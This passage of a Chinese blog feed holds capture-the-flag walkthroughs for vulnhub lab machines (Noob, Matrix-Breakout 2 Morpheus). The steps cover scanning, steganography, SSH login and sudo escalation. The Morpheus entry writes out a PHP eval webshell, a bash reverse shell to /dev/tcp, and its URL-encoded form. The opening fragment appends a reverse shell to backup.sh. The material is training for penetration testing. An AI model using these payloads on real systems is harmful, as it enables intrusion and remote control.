>/tmp/f"</span> <span class="token operator">>></span> backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130172619811.png" alt="image-20240130172619811"></p><p>等一会可以看到反弹成功，我们查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130172935974.png" alt="image-20240130172935974"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.msf工具使用</p><p>10.ssh私钥文件</p><p>11.john爆破密码</p><p>12.反弹shell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Noob</title>
    <link href="http://ms02423.top/2024/01/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BNoob/"/>
    <id>http://ms02423.top/2024/01/28/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BNoob/</id>
    <published>2024-01-28T11:27:34.000Z</published>
    <updated>2024-01-29T16:04:23.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">N<span class="token operator">/</span>A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>noob-1<span class="token punctuation">,</span><span class="token number">746</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128211902917.png" alt="image-20240128211902917"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128211918357.png" alt="image-20240128211918357"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.72.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.72.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.72.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212323289.png" alt="image-20240128212323289"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212522845.png" alt="image-20240128212522845"></p><p>靶场真实ip地址为192.168.72.129</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212426955.png" alt="image-20240128212426955"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口， vsftpd <span class="token number">3.0</span><span class="token number">.3</span>发现开启了<span class="token number">80</span>端口<span class="token punctuation">,</span> Apache httpd <span class="token number">2.4</span><span class="token number">.29</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">55077</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>6p1 Ubuntu 4ubuntu0<span class="token punctuation">.</span><span class="token number">5</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们看到开启了21端口，我们一会可以试试ftp服务</p><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>!<img src="/./../imgs/$%7Bfiilename%7D/image-20240128212851814.png" alt="image-20240128212851814"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128212951115.png" alt="image-20240128212951115"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213218377.png" alt="image-20240128213218377"></p><p>我们可以看到是一个登录页面</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213335260.png" alt="image-20240128213335260"></p><p>没有有用的信息</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213528959.png" alt="image-20240128213528959"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.72.129 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128213746074.png" alt="image-20240128213746074"></p><p>没有任何信息</p><p>前面我们提到21端口开启，那么我们就服务21端口看看</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-访问21端口"><a href="#1-访问21端口" class="headerlink" title="1)访问21端口"></a>1)访问21端口</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp://192.168.72.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214234920.png" alt="image-20240128214234920"></p><p>我们可以看到2个文件，我们进行查看</p><h4 id="2-查看文件"><a href="#2-查看文件" class="headerlink" title="2)查看文件"></a>2)查看文件</h4><p>我们首先查看cred.txt文件，可以看到是一个base64编码的，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214550379.png" alt="image-20240128214550379"></p><p>我们可以看到是用户名和密码，我们进行登录试试</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214819815.png" alt="image-20240128214819815"></p><p>点击About Us,可下载附件downloads.rar</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128214906104.png" alt="image-20240128214906104"></p><p>解压缩后，里面有 3 个文件，其中 sudo 文件内容提示注意文件名sudo</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128215014870.png" alt="image-20240128215014870"></p><p>那么我们就放到kali里面进行查看</p><h4 id="3-图片隐写"><a href="#3-图片隐写" class="headerlink" title="3)图片隐写"></a>3)图片隐写</h4><p>这里我们用的一个图片隐写的工具——steghide</p><p>查看发现 funny.jpg 图片存在隐写的文件，且密码为空</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide  <span class="token parameter variable">--info</span>  <span class="token string">'/home/kali/桌面/downloads/funny.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128215834066.png" alt="image-20240128215834066"></p><p>使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide extract <span class="token parameter variable">-sf</span>  <span class="token string">'/home/kali/桌面/downloads/funny.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提取出隐写的文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220028364.png" alt="image-20240128220028364"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220109025.png" alt="image-20240128220109025"></p><p>查看提取出的 hint.py 文件内容，试着旋转一些单词似乎是在提示 rot13 加密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220215805.png" alt="image-20240128220215805"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128220429602.png" alt="image-20240128220429602"></p><p>查看发现 funny.bmp 图片也存在隐写的文件，但是不知道密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide  <span class="token parameter variable">--info</span>  <span class="token string">'/home/kali/桌面/downloads/funny.bmp'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221102248.png" alt="image-20240128221102248"></p><p>想到刚才说注意文件的名称，尝试密码sudo成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221141855.png" alt="image-20240128221141855"></p><p>提取隐写的文件并查看，发现一段字符串，应该是被打乱了顺序或者加密过</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide extract <span class="token parameter variable">-sf</span>  <span class="token string">'/home/kali/桌面/downloads/funny.bmp'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221303771.png" alt="image-20240128221303771"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221333249.png" alt="image-20240128221333249"></p><h4 id="4-rot13-加密"><a href="#4-rot13-加密" class="headerlink" title="4)rot13 加密"></a>4)rot13 加密</h4><p>想到之前 hint.py 里的内容，推测可能是 rot13 加密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128221421699.png" alt="image-20240128221421699"></p><p>我们可以看到这个好像一个账号和密码，在前面扫描的端口当中，我们还有一个55077端口没有使用，服务是ssh服务，我们可以试试</p><h4 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> wtf@192.168.72.129 <span class="token parameter variable">-p</span> <span class="token number">55077</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222029956.png" alt="image-20240128222029956"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222044017.png" alt="image-20240128222044017"></p><p>我们可以看到登录成功了</p><h4 id="6-sudo-提权"><a href="#6-sudo-提权" class="headerlink" title="6)sudo 提权"></a>6)sudo 提权</h4><p>查看该用户有哪些 sudo 权限的命令，发现是 ALL</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222252797.png" alt="image-20240128222252797"></p><p>那么直接提权 sudo su,获取 flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240128222357873.png" alt="image-20240128222357873"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.binwalk、steghide 查看是否有隐写文件</p><p>10.ssh登录</p><p>11.base64解密，rot13解密</p><p>12.sudo提权</p><p>13.ftp服务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Matrix-Breakout 2 Morpheus</title>
    <link href="http://ms02423.top/2024/01/26/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BMatrix-Breakout/"/>
    <id>http://ms02423.top/2024/01/26/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BMatrix-Breakout/</id>
    <published>2024-01-26T12:50:32.000Z</published>
    <updated>2024-01-29T16:04:03.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">This <span class="token keyword">is</span> the second <span class="token keyword">in</span> the Matrix-Breakout series<span class="token punctuation">,</span> subtitled Morpheus<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">.</span> It’s themed <span class="token keyword">as</span> a throwback <span class="token keyword">to</span> the <span class="token keyword">first</span> Matrix movie<span class="token punctuation">.</span> You play Trinity<span class="token punctuation">,</span> trying <span class="token keyword">to</span> investigate a computer <span class="token keyword">on</span> the Nebuchadnezzar that Cypher has locked everyone <span class="token keyword">else</span> out <span class="token keyword">from</span><span class="token punctuation">,</span> which holds the <span class="token keyword">key</span> <span class="token keyword">to</span> a mystery<span class="token punctuation">.</span>Difficulty<span class="token punctuation">:</span> Medium-Hard <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>matrix-breakout-2-morpheus<span class="token punctuation">,</span><span class="token number">757</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205617771.png" alt="image-20240126205617771"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205642803.png" alt="image-20240126205642803"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205804406.png" alt="image-20240126205804406"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210338945.png" alt="image-20240126210338945"></p><p>靶场真实ip地址为192.168.52.135</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210944454.png" alt="image-20240126210944454"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">80</span>端口，APache httpd <span class="token number">2.4</span><span class="token number">.51</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">8</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">81</span>端口<span class="token punctuation">,</span>nginx <span class="token number">1.18</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210530329.png" alt="image-20240126210530329"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211229279.png" alt="image-20240126211229279"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211330248.png" alt="image-20240126211330248"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.135:81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211351460.png" alt="image-20240126211351460"></p><p>访问81端口，发现需要账号密码，尝试了一下弱口令，未能成功登录。</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211525473.png" alt="image-20240126211525473"></p><p>没有有用的信息</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211638612.png" alt="image-20240126211638612"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.135 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211907378.png" alt="image-20240126211907378"></p><p>扫描到一个robots.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211845683.png" alt="image-20240126211845683"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126212009937.png" alt="image-20240126212009937"></p><p>没有任何信息</p><p>截止到目前，我们没有找到任何有用的信息，我们可以换一个思路进行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">还是将重点放回<span class="token number">80</span>端口，因为robot<span class="token punctuation">.</span>txt提示我们继续找找，可能是因为我们的字典太小了，我们换个扫描器换个字典试下<span class="token punctuation">,</span>我们使用另外两个字典进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffuf <span class="token parameter variable">-u</span> http://192.168.52.135/FUZZ <span class="token parameter variable">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="token parameter variable">-c</span> <span class="token parameter variable">-ic</span> <span class="token parameter variable">-e</span> .txt,.zip,.php,html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126220323300.png" alt="image-20240126220323300"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126220400619.png" alt="image-20240126220400619"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.52.135 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">-x</span> php,txt,html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126221049984.png" alt="image-20240126221049984"></p><pre class="line-numbers language-none"><code class="language-none">graffiti.txtgraffiti.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来我们访问这两个php,txt文件</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-访问graffiti-php页面"><a href="#1-访问graffiti-php页面" class="headerlink" title="1)访问graffiti.php页面"></a>1)访问graffiti.php页面</h4><p>我们可以看到有一个输入框，我们输入MS02423,看到返回页面显示了MS02423</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126221929278.png" alt="image-20240126221929278"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126222001551.png" alt="image-20240126222001551"></p><h4 id="2-访问graffiti-txt页面"><a href="#2-访问graffiti-txt页面" class="headerlink" title="2)访问graffiti.txt页面"></a>2)访问graffiti.txt页面</h4><p>我们可以看到返回页面和graffiti.php页面是一样的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126222026957.png" alt="image-20240126222026957"></p><p>然后我们进行抓包看看，我们可以看到变量名是file</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127205656535.png" alt="image-20240127205656535"></p><p>此处有一个file变量，那么改变file变量可以直接对靶机文件修改，能随意创建文件,二话不说写个马，准备反弹shell</p><h4 id="3-抓包写入一句话木马"><a href="#3-抓包写入一句话木马" class="headerlink" title="3)抓包写入一句话木马"></a>3)抓包写入一句话木马</h4><p>在burp里面空格要使用+号代替</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">message</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php+@eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>MS02423<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">>&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span>MS02423.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127210157312.png" alt="image-20240127210157312"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">在写入一句话木马的时候，大家一定要把火绒关闭，不然的话会把杀掉<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211015900.png" alt="image-20240127211015900"></p><p>蚁剑连接成功，我们可以看到一些文件，但是都没有什么用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211104975.png" alt="image-20240127211104975"></p><p>我们进入虚拟终端看看有没有什么东西，最后发现了一个flag 1</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211735204.png" alt="image-20240127211735204"></p><p>我们找到了Flag 1!,提示我们从80端口的Web服务器中提取此图像以获得另外一个flag，图像的名称叫&#x2F;.cypher-neo.png,可以看到是一个隐藏文件。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127212421628.png" alt="image-20240127212421628"></p><h4 id="4-反弹webshell"><a href="#4-反弹webshell" class="headerlink" title="4)反弹webshell"></a>4)反弹webshell</h4><p>蚁剑的文件不是完整的，可能会有隐藏文件，此处简单一点直接在反弹shell双管齐下（一句话魔改一下）（记得要弄url编码）（干掉问号和空格和&amp;）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php exec<span class="token punctuation">(</span><span class="token string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.52.152/666 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编码之后,访问文件即可即可反弹shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.52.152%2F666+0%3E%261%27%22%29%3B+%3F%3E  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127213134624.png" alt="image-20240127213134624"></p><p>浏览器访问即可</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.152&#x2F;3.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们使用ls -la 可以看到隐藏图片，我们进行下载到kali</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127213800385.png" alt="image-20240127213800385"></p><h4 id="5-分析图片"><a href="#5-分析图片" class="headerlink" 